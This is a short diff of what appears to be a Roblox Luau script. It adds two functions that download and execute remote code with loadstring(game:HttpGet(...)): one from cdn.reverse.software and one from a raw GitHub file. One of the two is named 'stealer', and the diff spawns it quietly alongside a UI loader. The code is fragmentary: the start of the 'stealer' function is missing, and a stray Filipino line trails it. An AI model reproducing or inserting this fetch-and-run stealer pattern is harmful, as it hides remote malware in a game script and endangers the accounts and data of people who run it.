@@ -1,2 +1,11 @@
-ID="ca64ada4-7f33-4d68-bad9-e1a373c7dcc2";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+  ID="ca64ada4-7f33-4d68-bad9-e1a373c7dcc2"
+  loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/GnomeStorage/LUAs/refs/heads/main/5cdnew"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
+ganito sakin
